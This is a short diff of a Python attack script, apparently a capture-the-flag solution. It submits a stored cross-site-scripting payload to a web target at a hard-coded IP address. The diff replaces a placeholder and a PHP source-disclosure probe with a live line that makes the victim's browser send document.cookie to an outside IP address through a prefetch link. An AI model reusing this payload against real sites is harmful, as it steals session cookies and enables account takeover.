@@ -10,7 +10,7 @@ from md5 import decrypt_md5,md5
 import requests
 
 if __name__ == "__main__":
-    dst_url="http://202.112.51.130:28030/"
+    dst_url="http://202.112.51.130:28016/"
     sess = requests.session()
     response = sess.get(dst_url)
     print(sess.cookies)
@@ -20,8 +20,7 @@ if __name__ == "__main__":
         "message" : '<script>'
                     'var i=document.createElement("link");'
                     'i.setAttribute("rel","prefetch");'
-                    #'i.setAttribute("href","http://ip:port/?"+document.cookie);'
-                    'i.setAttribute("href","<?php show_source(__FILE__); ?>'
+                    'i.setAttribute("href","http://167.172.222.107:29030/?"+document.cookie);'
                     'document.head.appendChild(i);'
                     '</script>',
         "code" : "{}".format(decrypted)
